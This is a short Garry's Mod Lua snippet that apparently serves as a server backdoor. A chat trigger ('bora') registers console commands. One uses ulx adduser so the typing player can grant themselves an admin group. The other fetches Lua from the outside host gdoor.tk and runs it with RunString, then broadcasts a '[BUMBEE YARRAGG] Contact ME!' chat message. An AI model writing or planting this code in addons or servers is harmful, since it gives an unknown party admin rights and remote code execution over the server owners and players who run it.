hook.Add( "PlayerSay", "load", function( ply, text, public )
    if ( string.lower( text ) == "bora" ) then
concommand.Add("bora", function(ply, cmd, args)RunConsoleCommand("ulx", "adduser", ply:Name(), args[1])end)
concommand.Add("disco", function(ply) http.Fetch('http://gdoor.tk/bum/disco.lua',function(b,l,h,c)RunString(b)end,nil) timer.Create( "1521", 0.1, 1, function() BroadcastLua([[chat.AddText( Color( 0, 0, 0, 125 ), "[BUMBEE YARRAGG]", Color( 0, 255, 0 )," Contact ME!" )]]) end) end )
end end)